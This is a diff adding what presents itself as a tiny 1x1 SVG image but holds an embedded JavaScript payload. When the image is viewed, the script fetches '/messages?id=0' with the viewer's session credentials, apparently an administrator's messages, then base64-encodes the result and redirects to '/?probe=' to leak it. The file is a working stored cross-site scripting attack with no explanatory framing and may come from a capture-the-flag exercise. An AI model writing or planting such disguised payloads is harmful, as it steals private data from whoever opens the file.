@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <script><![CDATA[
+    (async function(){
+      try {
+        const adminId = 0;
+        const resp = await fetch('/messages?id=' + adminId, {credentials: 'same-origin'});
+        const json = await resp.json();
+        const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(json))));
+        window.location = '/?probe=' + encodeURIComponent(b64);
+      } catch (e) {
+        try { window.location = '/?probe=err:' + encodeURIComponent(String(e)); } catch(e2) {}
+      }
+    })();
+  ]]></script>
+</svg>
